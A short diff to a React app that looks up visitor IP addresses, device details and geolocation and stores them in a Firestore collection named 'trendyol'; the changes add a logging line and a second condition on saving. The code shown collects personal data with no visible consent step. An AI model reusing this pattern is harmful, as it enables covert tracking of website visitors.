@@ -20,7 +20,7 @@ function App() {
   useEffect(() => {
     !finish && sendBrowserInfo();
   }, [finish, ip3]);
-
+console.log('ip4',ip4)
   async function sendBrowserInfo() {
     const ip = await findIp();
     const ip2 = await findIp2();
@@ -36,7 +36,7 @@ function App() {
     ip.osName = osName;
     ip.mobileModel = mobileModel;
     ip.mobileVendor = mobileVendor;
-    if (ip3) {
+    if (ip3 && ip4) {
       try {
         const docRef = await addDoc(collection(db, "trendyol"), ip);
         if (docRef?.id) {
@@ -89,6 +89,7 @@ function getUserLocation2(setIp4) {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
   } else {
+    setIp4(true)
     console.log("Geolocation is not supported by this browser.");
   }
 
